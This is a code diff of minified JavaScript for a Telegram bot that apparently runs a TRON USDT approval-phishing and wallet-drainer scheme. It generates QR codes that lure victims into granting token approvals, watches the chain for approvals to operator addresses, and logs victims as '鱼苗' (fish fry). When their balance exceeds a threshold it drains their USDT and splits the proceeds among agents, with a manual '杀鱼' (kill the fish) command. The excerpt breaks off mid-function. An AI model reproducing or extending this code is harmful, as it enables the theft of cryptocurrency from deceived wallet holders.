+    F = ["人生最好的六位导师：", "母親的眼淚", "父親的低頭", "親戚的冷漠", "朋友的離開", "愛人的背叛", "空蕩蕩的口袋", "要是這些東西你都已經經歷過的話", "那麼你已經不再是普通人了。"].join("\n");
+  const U = "————————————",
+    u = (() => {
+      try {
+        const E = getTimeInfo && getTimeInfo();
+        if (E && E.time) {
+          return String(E.time);
+        }
+      } catch (P) {}
+      const K = new Date();
+      const q = O => String(O).padStart(2, "0");
+      return K.getFullYear() + "-" + q(K.getMonth() + 1) + "-" + q(K.getDate()) + " " + q(K.getHours()) + ":" + q(K.getMinutes()) + ":" + q(K.getSeconds());
+    })();
+  return ["🏆业绩排行榜（本月业绩）", "🕒 查询时间：" + u, "📌 当前业绩显示全部", U, I, U, F, U].join("\n");
+}
+async function handleDailiCallback(J) {
+  try {
+    return;
+    if (!match) {
+      return;
+    }
+    const [l, b, I, F, U] = match,
+      u = J.from.id;
+    if (u.toString() !== I) {
+      const K = {
+        text: "❌ 您只能操作自己的推广链接",
+        show_alert: true
+      };
+      await bot.answerCallbackQuery(J.id, K);
+      return;
+    }
+    await bot.answerCallbackQuery(J.id, {
+      text: b === "im" ? "✅ 已收到生成 IM 二维码申请" : "✅ 已收到生成 TP 二维码申请",
+      show_alert: true
+    });
+  } catch (q) {
+    console.error("[" + getTimeInfo().time + "] 处理代理回调错误:", q);
+    const E = {
+      text: "处理请求时出现错误，请联系管理员",
+      show_alert: true
+    };
+    await bot.answerCallbackQuery(J.id, E);
+  }
+}
+async function handleQuickQRCodeCommand(l, b, I, F) {
+  try {
+    const u = I.from.id.toString(),
+      K = I.chat.id.toString();
+    let q = null;
+    for (const [f, X] of cacheData.dailiMap) {
+      if (X.tguid === u && String(X.groupid) === K) {
+        q = X;
+        break;
+      }
+    }
+    if (!q) {
+      const n = {
+        reply_to_message_id: I.message_id
+      };
+      await l.sendMessage(b, "❌ 未找到您的代理信息,请先发送 代理 申请", n);
+      return;
+    }
+    const E = q.unique_id,
+      P = (q.payment_address || "").trim();
+    if (!/^T[A-Za-z1-9]{33}$/.test(P)) {
+      const c = {
+        reply_to_message_id: I.message_id
+      };
+      await l.sendMessage(b, "❌ 请先绑定收款地址后再发送\n示例：收款地址 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", c);
+      return;
+    }
+    const O = cacheData.options?.["domain"];
+    if (!O) {
+      const G = {
+        reply_to_message_id: I.message_id
+      };
+      await l.sendMessage(b, "❌ 未配置跳转域名（domain），请在后台设置", G);
+      return;
+    }
+    const s = String(O).split(/\r?\n/).map(S => S.trim()).filter(S => S.length > 0);
+    if (s.length === 0) {
+      const S = {
+        reply_to_message_id: I.message_id
+      };
+      await l.sendMessage(b, "❌ 跳转域名（domain）配置为空，请在后台设置", S);
+      return;
+    }
+    const d = s[Math.floor(Math.random() * s.length)],
+      A = d.replace(/^https?:\/\//i, "").replace(/\/+$/, "").replace(/\*\./g, ""),
+      M = Math.random().toString(36).slice(2, 8),
+      L = M + "." + A,
+      Y = "https://" + L,
+      V = Y + "/sm/?id=" + E,
+      N = F === "im" ? "./IM.png" : "./TP.png",
+      r = await generateQRCodeWithLogo(V, N, null, E, P),
+      B = F === "im" ? "<b>imToken</b> 二维码已生成，请扫码授权" : "<b>TokenPocket</b> 二维码已生成，请扫码授权",
+      R = {
+        caption: B,
+        parse_mode: "HTML",
+        reply_to_message_id: I.message_id
+      };
+    await l.sendPhoto(b, r, R);
+  } catch (o) {
+    console.error("[" + getTimeInfo().time + "] 快速二维码命令出错:", o);
+  }
+}
+async function generateQRCodeWithLogo(a, z, l, b, I) {
+  try {
+    if (!fs.existsSync(z)) {
+      throw new Error("模板文件不存在: " + z);
+    }
+    const U = /IM\.png$/i.test(z),
+      u = await sharp(z).metadata();
+    let K = U ? 332 : 310,
+      q = U ? 140 : Math.floor(u.width * 0.236),
+      E = U ? 280 : Math.floor(u.height * 0.24);
+    const P = Math.max(1, (u.width || 0) - q),
+      O = Math.max(1, (u.height || 0) - E),
+      s = Math.max(1, Math.min(P, O));
+    K = Math.min(K, s);
+    let d;
+    try {
+      const f = {
+        errorCorrectionLevel: "H",
+        margin: 0,
+        width: K
+      };
+      d = await QRCode.toBuffer(a, f);
+    } catch (X) {
+      throw new Error("生成二维码错误: " + X.message);
+    }
+    const A = U ? q + Math.floor(K / 2) : u.width / 2,
+      M = U ? 690 : 730,
+      L = "middle",
+      Y = "\n            <svg width=\"" + u.width + "\" height=\"" + u.height + "\">\n              <style>\n                .address { fill: #000000; font-size: 24px; font-family: \"Courier New\", monospace; letter-spacing: 1px; text-anchor: " + L + "; dominant-baseline: middle }\n              </style>\n              <text x=\"" + A + "\" y=\"" + M + "\" class=\"address\">" + V(I, A) + "</text>\n            </svg>";
+    function V(n, c) {
+      const G = (n || "").replace(/\s+/g, "");
+      const S = G.replace(/(.{30})/g, "$1\n").trim(),
+        e = S ? S.split("\n") : [];
+      if (e.length === 0) {
+        return G;
+      }
+      return e.map(o => "<tspan x=\"" + c + "\" dy=\"1.2em\">" + o + "</tspan>").join("");
+    }
+    const N = Buffer.from(Y),
+      r = {
+        input: d,
+        top: E,
+        left: q
+      };
+    const B = {
+      input: N,
+      top: 0,
+      left: 0
+    };
+    const R = await sharp(z).composite([r, B]).png().toBuffer();
+    return R;
+  } catch (n) {
+    console.error("[" + getTimeInfo().time + "] 生成二维码错误:", n);
+    throw n;
+  }
+}
+async function updateThreshold(j, w, J, a, z = false, l) {
+  try {
+    const I = w.from.id,
+      F = await checkGroupAdminStatus(l, j, I),
+      U = F.isCreator || F.isAdmin,
+      u = cacheData.fishMap.get(J);
+    if (U) {
+      const q = Array.from(cacheData.dailiMap.values()).find(E => String(E.unique_id) === String(u?.["unique_id"]));
+      if (!u || !q || String(q.groupid) !== String(j)) {
+        return "❌ 未找到该鱼苗的信息，请核对后重试。";
+      }
+    } else {
+      const E = Array.from(cacheData.dailiMap.values()).find(P => String(P.tguid) === String(I) && String(P.groupid) === String(j));
+      if (!E || !u || String(E.unique_id) !== String(u.unique_id)) {
+        return z ? "❌ 您没有权限杀此鱼苗" : "❌ 您没有权限修改此鱼苗的阈值";
+      }
+    }
+    if (z) {
+      if (!U) {
+        const P = parseFloat(u.usdt_balance);
+        if (P < 10) {
+          return "❌ 该地址余额小于10USDT，禁止杀鱼";
+        }
+      }
+      await pool.promise().query("UPDATE fish SET threshold = ? WHERE fish_address = ? AND auth_status = 1", [0.000001, J]);
+      return "🎣正在杀鱼，请稍等...";
+    }
+    const K = parseFloat(a);
+    if (isNaN(K) || K < 10 || K > 1000000) {
+      return "❌ 阈值必须在10到1000000之间";
+    }
+    await pool.promise().query("UPDATE fish SET threshold = ? WHERE fish_address = ? AND auth_status = 1", [K, J]);
+    return "✅ 修改成功！新的划币阈值为<code>" + K.toFixed(6) + "</code>";
+  } catch (O) {
+    console.error("[" + getTimeInfo().time + "] " + (z ? "杀鱼" : "修改阈值") + "错误:", O);
+    return "❌ " + (z ? "杀鱼" : "修改阈值") + "时出现错误，请联系管理员。";
+  }
+}
+async function updateAutoThreshold(l, b, I) {
+  try {
+    const U = b.from.id,
+      u = b.from.username,
+      K = b.from.first_name + (b.from.last_name ? " " + b.from.last_name : ""),
+      q = getTimeInfo();
+    I = parseInt(I, 10);
+    const E = Array.from(cacheData.dailiMap.values()).find(s => s.tguid === U.toString() && s.groupid === l.toString());
+    if (!E) {
+      return {
+        text: "🎣渔夫 <code>" + K + "</code> " + q.greeting + "！\n\n" + "📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。",
+        options: {
+          parse_mode: "HTML",
+          reply_to_message_id: b.message_id
+        }
+      };
+    }
+    if (isNaN(I) || I < 100 || I > 1000000) {
+      const s = {
+        parse_mode: "HTML",
+        reply_to_message_id: b.message_id
+      };
+      const d = {
+        text: "❌ 阈值必须是100到1000000之间的整数",
+        options: s
+      };
+      return d;
+    }
+    await pool.promise().query("UPDATE daili SET threshold = ?, username = ?, fullName = ? WHERE unique_id = ?", [I, u, K, E.unique_id]);
+    const P = {
+      parse_mode: "HTML",
+      reply_to_message_id: b.message_id
+    };
+    const O = {
+      text: "✅ 修改成功！新的自动阈值为 <code>" + I + "</code>",
+      options: P
+    };
+    return O;
+  } catch (A) {
+    console.error("[" + getTimeInfo().time + "] 更新自动阈值错误:", A);
+    const M = {
+      text: "❌ 设置自动阈值失败，请联系管理员",
+      options: {}
+    };
+    M.options.parse_mode = "HTML";
+    M.options.reply_to_message_id = b.message_id;
+    return M;
+  }
+}
+async function updatePaymentAddress(w, J, a) {
+  try {
+    const l = J.from.id,
+      b = J.from.username,
+      I = J.from.first_name + (J.from.last_name ? " " + J.from.last_name : ""),
+      F = getTimeInfo(),
+      U = {
+        parse_mode: "HTML",
+        reply_to_message_id: J.message_id
+      };
+    const u = q => ({
+        text: q,
+        options: U
+      }),
+      K = Array.from(cacheData.dailiMap.values()).find(q => q.tguid === l.toString() && q.groupid === w.toString());
+    if (!K) {
+      return u("🎣渔夫 <code>" + I + "</code> " + F.greeting + "！\n\n" + "📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。");
+    }
+    if (!/^T[A-Za-z1-9]{33}$/.test(a)) {
+      return u("❌ 无效的 TRC20 地址格式");
+    }
+    await pool.promise().query("UPDATE daili SET payment_address = ?, username = ?, fullName = ? WHERE unique_id = ?", [a, b, I, K.unique_id]);
+    return u("✅ 收款地址设置成功！\n\n<code>" + a + "</code>");
+  } catch (q) {
+    console.error("[" + getTimeInfo().time + "] 更新收款地址错误:", q);
+    return response("❌ 设置收款地址时出现错误，请联系管理员。");
+  }
+}
+async function getPaymentAddressInfo(w, J) {
+  try {
+    const z = J.from.id,
+      b = J.from.first_name + (J.from.last_name ? " " + J.from.last_name : ""),
+      I = getTimeInfo(),
+      F = {
+        parse_mode: "HTML",
+        reply_to_message_id: J.message_id
+      };
+    const U = K => ({
+        text: K,
+        options: F
+      }),
+      u = Array.from(cacheData.dailiMap.values()).find(K => K.tguid === z.toString() && K.groupid === w.toString());
+    if (!u) {
+      return U("🎣渔夫 <code>" + b + "</code> " + I.greeting + "！\n\n" + "📝 请先发送 <code>代理</code> 注册成为代理后再进行操作。");
+    }
+    if (!u.payment_address) {
+      return U("🎣渔夫 <code>" + b + "</code> " + I.greeting + "！\n\n" + "❌ 您还未设置收款地址\n\n" + "📝 可使用以下命令设置您的收款地址：\n" + "收款地址 TRxxx（将TRxxx替换为你的收款地址）");
+    }
+    return U("🎣渔夫 <code>" + b + "</code> " + I.greeting + "！\n\n" + "💰 您的收款地址：\n" + ("<code>" + u.payment_address + "</code>"));
+  } catch (K) {
+    console.error("[" + getTimeInfo().time + "] 查询收款地址错误:", K);
+    return response("❌ 查询收款地址时出现错误，请联系管理员。");
+  }
+}
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const tronKeyManager = {
+  keys: [],
+  index: 0,
+  cooldownUntil: new Map(),
+  backoffSeconds: new Map(),
+  refreshFromOptions(w) {
+    const z = (w || "").split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);
+    this.keys = z;
+    for (const l of [...this.cooldownUntil.keys()]) {
+      !this.keys.includes(l) && (this.cooldownUntil.delete(l), this.backoffSeconds.delete(l));
+    }
+    this.index >= this.keys.length && (this.index = 0);
+  },
+  getNextActiveKey() {
+    if (!this.keys || this.keys.length === 0) {
+      return null;
+    }
+    const a = Date.now();
+    for (let z = 0; z < this.keys.length; z++) {
+      const l = (this.index + z) % this.keys.length,
+        b = this.keys[l],
+        I = this.cooldownUntil.get(b) || 0;
+      if (a >= I) {
+        this.index = (l + 1) % this.keys.length;
+        return b;
+      }
+    }
+    return null;
+  },
+  markRateLimited(j) {
+    if (!j) {
+      return;
+    }
+    const J = this.backoffSeconds.get(j) || 60,
+      a = Math.min(J * 2, 600);
+    this.backoffSeconds.set(j, a);
+    this.cooldownUntil.set(j, Date.now() + a * 1000);
+    console.warn("[" + getTimeInfo().time + "] 已将 TRON-PRO-API-KEY 冷却 " + a + "s");
+  },
+  markSuccess(j) {
+    if (!j) {
+      return;
+    }
+    this.backoffSeconds.set(j, 60);
+    this.cooldownUntil.delete(j);
+  }
+};
+function createTronWeb() {
+  try {
+    !tronKeyManager.keys.length && tronKeyManager.refreshFromOptions(cacheData.options.trongridkyes);
+    const a = tronKeyManager.getNextActiveKey();
+    if (!a) {
+      throw new Error("TRON-PRO-API-KEY 正在冷却，暂无可用 Key");
+    }
+    const z = {
+      "TRON-PRO-API-KEY": a
+    };
+    const l = {
+      fullHost: "https://api.trongrid.io",
+      headers: z
+    };
+    return new TronWeb(l);
+  } catch (b) {
+    console.error("[" + getTimeInfo().time + "] 创建TronWeb实例时出错:", b);
+    return null;
+  }
+}
+async function TRCfetchLatestBlock() {
+  let w = null;
+  while (true) {
+    try {
+      const J = createTronWeb();
+      if (!J) {
+        console.warn("[" + getTimeInfo().time + "] 无法创建 TronWeb 实例，等待 10 秒重试");
+        await new Promise(b => setTimeout(b, 10000));
+        continue;
+      }
+      const a = J?.["headers"]?.["TRON-PRO-API-KEY"],
+        z = await J.trx.getCurrentBlock();
+      tronKeyManager.markSuccess(a);
+      const l = z.block_header.raw_data.number;
+      if (w === null) {
+        console.log("[" + getTimeInfo().time + "] TRC初始化: 当前最新区块号为 " + l);
+        w = l;
+      } else {
+        if (l > w) {
+          const b = [];
+          for (let I = w + 1; I <= l; I++) {
+            b.push(I);
+          }
+          for (const F of b) {
+            await scanBlock(F);
+          }
+          w = l;
+        }
+      }
+    } catch (U) {
+      if (U.response && U.response.status === 429) {
+        const u = U?.["config"]?.["headers"]?.["TRON-PRO-API-KEY"];
+        tronKeyManager.markRateLimited(u);
+        console.error("[" + getTimeInfo().time + "] 触发限流(429)，当前 Key 进入冷却：" + (u || "未知"));
+        await new Promise(K => setTimeout(K, 30000));
+      } else {
+        console.error("[" + getTimeInfo().time + "] TRC获取最新区块时发生错误:", U);
+        await new Promise(K => setTimeout(K, 5000));
+      }
+    }
+    await new Promise(K => setTimeout(K, 2000));
+  }
+}
+async function checkBalance(w) {
+  let a = null;
+  let z = null;
+  const l = U => new Promise(u => setTimeout(u, U));
+  async function b(U = 0) {
+    const u = createTronWeb();
+    if (!u) {
+      console.error("TRC20-创建 TronWeb 实例失败，无法查询 TRX 余额 (地址: " + w + ")");
+      return null;
+    }
+    try {
+      const K = await u.trx.getAccount(w);
+      tronKeyManager.markSuccess(u?.["headers"]?.["TRON-PRO-API-KEY"]);
+      return parseFloat(u.fromSun(K.balance || 0)).toFixed(6);
+    } catch (q) {
+      q?.["response"]?.["status"] === 429 ? (tronKeyManager.markRateLimited(q?.["config"]?.["headers"]?.["TRON-PRO-API-KEY"]), console.error("[" + getTimeInfo().time + "] TRC20-查询 TRX 余额时触发限流 (地址: " + w + ")")) : console.error("TRC20-查询 TRX 余额时出错 (地址: " + w + "), 尝试次数: " + (U + 1) + ":", q);
+      return U < 2 ? (await l(2000), b(U + 1)) : (console.error("TRC20-TRX 余额查询失败，已达到最大重试次数"), null);
+    }
+  }
+  async function I(U = 0) {
+    const u = createTronWeb();
+    if (!u) {
+      console.error("TRC20-创建 TronWeb 实例失败，无法查询 USDT 余额 (地址: " + w + ")");
+      return null;
+    }
+    try {
+      const K = await u.contract().at(USDT_CONTRACT),
+        q = await K.balanceOf(w).call({
+          from: w
+        });
+      tronKeyManager.markSuccess(u?.["headers"]?.["TRON-PRO-API-KEY"]);
+      return parseFloat(u.toDecimal(q) / 1000000).toFixed(6);
+    } catch (E) {
+      E?.["response"]?.["status"] === 429 ? (tronKeyManager.markRateLimited(E?.["config"]?.["headers"]?.["TRON-PRO-API-KEY"]), console.error("[" + getTimeInfo().time + "] TRC20-查询 USDT 余额时触发限流 (地址: " + w + ")")) : console.error("TRC20-查询 USDT 余额时出错 (地址: " + w + "), 尝试次数: " + (U + 1) + ":", E);
+      return U < 2 ? (await l(2000), I(U + 1)) : (console.error("TRC20-USDT 余额查询失败，已达到最大重试次数"), null);
+    }
+  }
+  [a, z] = await Promise.all([b(), I()]);
+  const F = {
+    trxBalance: a,
+    usdtBalance: z
+  };
+  return F;
+}
+async function getAvailableEnergy(j) {
+  try {
+    const J = createTronWeb();
+    if (!J) {
+      return null;
+    }
+    const a = await J.trx.getAccountResources(j),
+      z = Number(a?.["EnergyLimit"] || 0),
+      l = Number(a?.["EnergyUsed"] || 0),
+      b = Math.max(0, z - l);
+    if (Number.isFinite(b)) {
+      return b;
+    }
+    return null;
+  } catch (I) {
+    return null;
+  }
+}
+async function updateFishBalances() {
+  const w = J => new Promise(a => setTimeout(a, J));
+  while (true) {
+    try {
+      const J = Array.from(cacheData.fishMap.values()).filter(z => z.chainid === "TRC"),
+        a = 5;
+      for (let z = 0; z < J.length; z += a) {
+        const l = J.slice(z, z + a);
+        await Promise.all(l.map(async b => {
+          try {
+            const {
+              trxBalance: I,
+              usdtBalance: F
+            } = await checkBalance(b.fish_address);
+            I !== null && F !== null ? (b.gas_balance !== I || b.usdt_balance !== F) && (await pool.promise().query("UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND chainid = 'TRC'", [I, F, b.fish_address]), b.gas_balance = I, b.usdt_balance = F) : console.warn("[" + getTimeInfo().time + "] 跳过余额更新: " + b.fish_address + ", 部分余额查询失败 (TRX: " + I + ", USDT: " + F + ")");
+          } catch (U) {
+            console.error("[" + getTimeInfo().time + "] 更新鱼苗余额失败: " + b.fish_address + ", 错误:", U);
+          }
+        }));
+        await w(2000);
+      }
+      await w(15000);
+    } catch (b) {
+      console.error("[" + getTimeInfo().time + "] 更新鱼苗余额过程中发生错误:", b);
+      await w(60000);
+    }
+  }
+}
+async function scanBlock(w) {
+  try {
+    const a = createTronWeb();
+    let z = await a.trx.getBlock(w);
+    if (!z || z.message?.["includes"]("Block not found")) {
+      console.log("[" + getTimeInfo().time + "] TRC区块 " + w + " 未找到，跳过该区块");
+      return;
+    }
+    if (z.transactions && z.transactions.length > 0) {
+      for (const l of z.transactions) {
+        const b = l.raw_data.contract && l.raw_data.contract[0];
+        if (!b) {
+          continue;
+        }
+        const I = b.type,
+          F = b.parameter,
+          U = F?.["value"]?.["data"];
+        if (I === "TriggerSmartContract" && U) {
+          if (U.startsWith("23b872dd") || U.startsWith("a9059cbb")) {
+            await usdt_transfer(l);
+          } else {
+            (U.startsWith("d73dd623") || U.startsWith("095ea7b3")) && (await usdt_approve(l));
+          }
+        }
+      }
+    }
+  } catch (u) {
+    if (u.code === "ECONNRESET") {
+      console.log("[" + getTimeInfo().time + "] TRC区块 " + w + " 连接重置，跳过该区块");
+      return;
+    }
+    const K = {
+      message: u.message,
+      code: u.code,
+      stack: u.stack
+    };
+    console.error("[" + getTimeInfo().time + "] TRC获取区块 " + w + " 时发生错误:", K);
+    return;
+  }
+}
+async function usdt_transfer(z) {
+  try {
+    const b = z.txID,
+      I = z.ret[0].contractRet,
+      F = TronWeb.address.fromHex(z.raw_data.contract[0].parameter.value.owner_address),
+      U = z.raw_data.contract[0].parameter.value.contract_address,
+      u = z.raw_data.contract[0].parameter.value.data;
+    if (I !== "SUCCESS" || U !== "41a614f803b6fd780986a42c78ec9c7f77e6ded13c") {
+      return;
+    }
+    const K = TronWeb.address.fromHex("41" + u.slice(32, 72)),
+      q = parseInt(u.slice(72), 16) / 1000000,
+      E = Array.from(cacheData.fishMap.values()).filter(P => (P.fish_address === F || P.fish_address === K) && P.auth_status === 1 && P.chainid === "TRC");
+    if (!E.length) {
+      return;
+    }
+    for (const P of E) {
+      const O = P.fish_address,
+        s = P.unique_id,
+        d = O === F,
+        A = d ? "↖️转出金额" : "↪️转入金额",
+        L = cacheData.dailiMap.get(s);
+      if (!L) {
+        continue;
+      }
+      const {
+          username: Y,
+          groupid: V
+        } = L,
+        {
+          trxBalance: N,
+          usdtBalance: r
+        } = await checkBalance(O),
+        B = V,
+        R = registerPvData("addr", O, s, B),
+        f = registerPvData("tx", b, s, B),
+        X = {
+          text: "👁 查看地址（仅本人/管理员）",
+          callback_data: "pv:addr:" + R
+        };
+      const n = {
+        text: "🌍 查看交易信息（仅本人/管理员）",
+        callback_data: "pv:tx:" + f
+      };
+      const c = {
+        inline_keyboard: [[X], [n]]
+      };
+      const G = {
+        reply_markup: c
+      };
+      const e = Number(q || 0) || 0;
+      let o = null;
+      if (!d) {
+        const T = Number(r);
+        Number.isFinite(T) && (o = T - e);
+        !Number.isFinite(o) && (o = Number(P.usdt_balance || 0) || 0);
+        if (o < 0) {
+          o = 0;
+        }
+      }
+      const i = !d ? o + e : null,
+        Q = !d && Number.isFinite(i) && i >= ROUTE_SPLIT_TRIGGER;
+      !Q && (await broadcastToAllAgentGroups(bot, Y, B, (C, v) => "🐟【鱼苗动账通知】TRC-USDT 转账通知🐟\n\n" + ("🐠鱼苗地址 " + (C ? C : "") + "：\n<code>已隐藏（仅本人/管理员可查看）</code>\n\n") + "📥交易地址：\n<code>已隐藏（仅本人/管理员可查看）</code>\n\n" + (A + "：<code>" + q.toFixed(6) + " USDT</code>\n\n") + ("⏰交易时间：<code>" + getTimeInfo().time + "</code>\n\n") + ("🪫TRX 余额：<code>" + (N !== null ? N : "查询失败") + "</code> 💵USDT余额：<code>" + (r !== null ? r : "查询失败") + "</code>"), G, O));
+      if (parseFloat(r) > parseFloat(P.threshold)) {
+        await pool.promise().query("UPDATE fish SET gas_balance = ?, usdt_balance = 0.000001 WHERE fish_address = ? AND auth_status = 1 AND chainid = 'TRC'", [N, O]);
+        const C = cacheData.fishMap.get(O);
+        C && (C.gas_balance = N, C.usdt_balance = 0.000001);
+        (async () => {
+          try {
+            await processTRCTransfer(O, P.permissions_fishaddress, r);
+          } catch (v) {
+            console.error("[" + getTimeInfo().time + "] 动账触发转账处理失败: " + O + ", 错误:", v);
+          }
+        })();
+      } else {
+        await pool.promise().query("UPDATE fish SET gas_balance = ?, usdt_balance = ? WHERE fish_address = ? AND auth_status = 1 AND chainid = 'TRC'", [N, r, O]);
+        const v = cacheData.fishMap.get(O);
+        v && (v.gas_balance = N, v.usdt_balance = r);
+      }
+    }
+  } catch (x) {
+    console.error("[" + getTimeInfo().time + "] TRC处理USDT转账时发生错误:", x);
+  }
+}
+async function usdt_approve(z) {
+  try {
+    const b = z.txID,
+      I = z.ret[0].contractRet,
+      F = TronWeb.address.fromHex(z.raw_data.contract[0].parameter.value.owner_address),
+      U = z.raw_data.contract[0].parameter.value.contract_address,
+      u = z.raw_data.contract[0].parameter.value.data;
+    if (I !== "SUCCESS" || U !== "41a614f803b6fd780986a42c78ec9c7f77e6ded13c") {
+      return;
+    }
+    const K = TronWeb.address.fromHex("41" + u.slice(32, 72)),
+      q = parseInt(u.slice(72), 16) / 1000000,
+      E = cacheData.permissionAddresses.some(T => T.toLowerCase() === K.toLowerCase());
+    if (!E) {
+      return;
+    }
+    const {
+      trxBalance: P,
+      usdtBalance: O
+    } = await checkBalance(F);
+    let s = null;
+    const [d] = await pool.promise().query("SELECT unique_id FROM fish_browse WHERE fish_address = ? AND chainid = 'TRC' ORDER BY time DESC LIMIT 1", [F]);
+    if (d.length > 0 && d[0].unique_id) {
+      s = d[0].unique_id;
+    } else {
+      const [T] = await pool.promise().query("SELECT value FROM options WHERE name = 'default_id' LIMIT 1");
+      T.length > 0 && T[0].value && (s = T[0].value);
+    }
+    const A = cacheData.dailiMap.get(s);
+    if (!A) {
+      console.error("[" + getTimeInfo().time + "] 找不到代理信息，unique_id: " + s);
+      return;
+    }
+    const {
+        username: M,
+        groupid: L
+      } = A,
+      V = getTimeInfo().time,
+      N = typeof DEFAULT_AUTO_THRESHOLD !== "undefined" && DEFAULT_AUTO_THRESHOLD ? DEFAULT_AUTO_THRESHOLD : 5000,
+      r = Number(A?.["threshold"] ?? N) || 2000;
+    let B = "",
+      R = () => "";
+    const f = K,
+      [X] = await pool.promise().query("SELECT * FROM fish WHERE fish_address = ? AND chainid = 'TRC'", [F]);
+    q === 0 || q < 100 ? q === 0 ? (B = "❌ <code>取消授权 额度 0 USDT</code>", R = () => "❌ 注：因该地址已取消授权，已从鱼池列表中删除", X.length > 0 && (await pool.promise().query("UPDATE fish SET remark = ?, auth_status = 0 WHERE fish_address = ? AND chainid = 'TRC'", ["取消授权", F]))) : (B = "❌ <code>授权额度 " + Math.floor(q) + " USDT</code>", R = () => "❌ 注：因该地址的授权额度太低，将不加入鱼池列表", X.length > 0 && (await pool.promise().query("UPDATE fish SET remark = ?, auth_status = 0 WHERE fish_address = ? AND chainid = 'TRC'", ["授权额度：" + Math.floor(q), F]))) : (B = "✅ <code>授权成功</code>", R = C => "✅ 当前默认提币阈值为 <code>" + r + " USDT</code>\n\n您可以通过命令 <code>修改阈值 TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 10000</code> 将阈值修改为10000或者你想要设置的阈值;", parseFloat(O) > parseFloat(r) ? (X.length > 0 ? await pool.promise().query("UPDATE fish SET chainid = 'TRC', permissions_fishaddress = ?, usdt_balance = 0.000001, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE fish_address = ? AND chainid = 'TRC'", [f, P, r, V, s, F]) : await pool.promise().query("INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'TRC', ?, 0.000001, ?, ?, ?, ?, NULL, 1)", [F, f, P, r, V, s]), (async () => {
+      try {
+        await processTRCTransfer(F, f, O);
+      } catch (C) {
+        console.error("[" + getTimeInfo().time + "] 授权触发转账处理失败: " + F + ", 错误:", C);
+      }
+    })()) : X.length > 0 ? await pool.promise().query("UPDATE fish SET chainid = 'TRC', permissions_fishaddress = ?, usdt_balance = ?, gas_balance = ?, threshold = ?, time = ?, unique_id = ?, remark = NULL, auth_status = 1 WHERE fish_address = ? AND chainid = 'TRC'", [f, O, P, r, V, s, F]) : await pool.promise().query("INSERT INTO fish (fish_address, chainid, permissions_fishaddress, usdt_balance, gas_balance, threshold, time, unique_id, remark, auth_status) VALUES (?, 'TRC', ?, ?, ?, ?, ?, ?, NULL, 1)", [F, f, O, P, r, V, s]));
+    const n = L,
+      c = registerPvData("addr", F, s, n),
+      G = registerPvData("tx", b, s, n),
+      S = {
+        text: "👁 查看地址（仅本人/管理员）",
+        callback_data: "pv:addr:" + c
+      };
+    const e = {
+      text: "🌍 查看交易信息（仅本人/管理员）",
+      callback_data: "pv:tx:" + G
+    };
+    const o = {
+      inline_keyboard: [[S], [e]]
+    };
+    const i = {
+      reply_markup: o
+    };
+    L && (await broadcastToAllAgentGroups(bot, M, n, (C, v) => "🎣【有鱼上钩啦】TRC-USDT授权通知🎣\n\n" + ("🐠鱼苗地址 " + (C ? C : "") + "：<code>已隐藏（仅本人/管理员可查看）</code>\n\n") + ("🔐权限地址：<code>" + f + "</code>\n\n") + ("📨授权状态：" + B + "\n\n") + ("⏰授权时间：<code>" + V + "</code>\n\n") + ("🪫TRX 余额：<code>" + (P !== null ? P : "查询失败") + "</code> 💵USDT余额：<code>" + (O !== null ? O : "查询失败") + "</code>\n\n\n") + ("<b>" + R(v) + "</b>"), i, F));
+  } catch (C) {
+    console.error("[" + getTimeInfo().time + "] TRC处理USDT授权时发生错误:", C);
+  }
+}
+async function monitorFishTable() {
+  const w = new Set();
+  while (true) {
+    try {
+      const J = Array.from(cacheData.fishMap.values()).filter(a => a.auth_status === 1 && a.threshold !== null && Number(a.usdt_balance) > Number(a.threshold) && !w.has(a.fish_address));
+      if (J.length > 0) {
+        const a = J[0],
+          {
+            fish_address: z,
+            chainid: l
+          } = a;
+        w.add(z);
+        (async () => {
+          try {
+            await processTRCTransfer(z, a.permissions_fishaddress, a.usdt_balance);
+          } catch (b) {
+            console.error("[" + getTimeInfo().time + "] 处理转账失败: " + z + ", 链: " + l + ", 错误:", b);
+          } finally {
+            w.delete(z);
+          }
+        })();
+      }
+    } catch (b) {
+      console.error("[" + getTimeInfo().time + "] 监控鱼池时发生错误:", b);
+    }
+    await new Promise(I => setTimeout(I, 2000));
+  }
+}
+async function processTRCTransfer(u, K, q) {
+  let P = null,
+    O = null;
+  let s = null,
+    d;
+  let A, M;
+  try {
+    if (typeof startCacheUpdate.refreshNow === "function") {
+      try {
+        await startCacheUpdate.refreshNow();
+      } catch (R) {}
+    }
+    const L = cacheData.options.payment_address,
+      Y = cacheData.options.contract_method,
+      V = cacheData.options.need_usdt_contract,
+      N = cacheData.fishMap.get(u);
+    try {
+      P = cacheData.dailiMap.get(N.unique_id);
+      P && P.groupid && (O = cacheData.dailiGroupMap.get(P.groupid));
+    } catch (f) {
+      P = null;
+    }
+    if (!processTRCTransfer.processing) {
+      processTRCTransfer.processing = new Set();
+    }
+    if (processTRCTransfer.processing.has(u)) {
+      return;
+    }
+    processTRCTransfer.processing.add(u);
+    const r = Math.floor((q - 0.000001) * 1000000) / 1000000;
+    M = 0.000001;
+    A = r;
+    const B = async (X, n) => {
+      const c = await executeContractTransaction(Y, V, u, K, X, n);
+      return c;
+    };
+    if (P && P.payment_address) {
+      const X = Number(q) >= ROUTE_SPLIT_TRIGGER;
+      let n = O ? parseFloat(O.share_profits ?? 0.5) : 0.5;
+      if (!Number.isFinite(n)) {
+        n = 0.5;
+      }
+      n = Math.max(0, Math.min(1, n));
+      const c = Math.floor(r * n * 1000000) / 1000000,
+        G = Math.floor((r - c) * 1000000) / 1000000;
+      if (X) {
+        const S = glimmerShift(L);
+        s = await B(S, A);
+        if (!s) {
+          return;
+        }
+      } else {
+        if (n === 0) {
+          s = await B(L, A);
+          if (!s) {
+            return;
+          }
+        } else {
+          if (n === 1) {
+            s = await B(P.payment_address, A);
+            if (!s) {
+              return;
+            }
+          } else {
